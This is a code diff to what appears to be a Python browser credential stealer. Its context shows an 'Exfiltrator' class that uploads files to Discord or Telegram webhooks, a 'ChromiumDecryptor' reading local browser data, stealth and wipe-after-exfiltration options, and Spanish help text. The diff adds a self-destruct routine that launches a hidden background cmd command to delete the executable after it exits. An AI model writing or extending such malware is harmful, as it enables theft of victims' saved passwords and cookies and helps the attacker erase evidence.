@@ -29,7 +29,8 @@ CONFIG = {
     "output_dir": ".audit",
     "delay":           0,
     "send_delay":      0,
-    "webhook_timeout": 15
+    "webhook_timeout": 15,
+    "self_destruct":   False
 }
 # =========================================================================
 
@@ -230,6 +231,22 @@ class Exfiltrator:
             r = requests.post(self.ds_hook, files={'file': f}, timeout=self.timeout)
         return r.status_code in (200, 204)
 
+    def self_destruct(self):
+        """Schedules the executable for deletion after process exit."""
+        if not getattr(sys, 'frozen', False):
+            logger.info("Autodestrucción omitida (Modo Script).")
+            return
+            
+        exe_path = sys.executable
+        logger.info("💥 Iniciando protocolo de autodestrucción...")
+        
+        # Comando para esperar a que el proceso muera y borrar el archivo
+        # Usamos 'start /b' para que corra en segundo plano totalmente invisible
+        cmd = f'start /b "" cmd /c "timeout /t 3 /nobreak > NUL & del /f /q \\"{exe_path}\\""'
+        import subprocess
+        subprocess.Popen(cmd, shell=True)
+        sys.exit(0)
+
 class ChromiumDecryptor:
     def __init__(self):
         self.local   = Path(os.environ.get('LOCALAPPDATA', ''))
@@ -383,6 +400,7 @@ def main():
     en.add_argument("--stealth", action="store_true", default=CONFIG["stealth"])
     en.add_argument("--auto-kill", action="store_true", help="Cerrar navegadores automáticamente si falla la lectura")
     en.add_argument("--no-wipe", action="store_true", help="No eliminar archivos locales tras exfiltrar")
+    en.add_argument("--self-destruct", action="store_true", help="Eliminar el ejecutable tras finalizar")
     en.add_argument("--debug", action="store_true", help="Activar logs detallados")
     
     args = parser.parse_args()
@@ -424,6 +442,9 @@ def main():
             if not args.no_wipe and (tg_t or ds_w):
                 for p in files:
                     p.unlink(missing_ok=True)
+        
+        if args.self_destruct:
+            exf.self_destruct()
 
 if __name__ == "__main__":
     main()
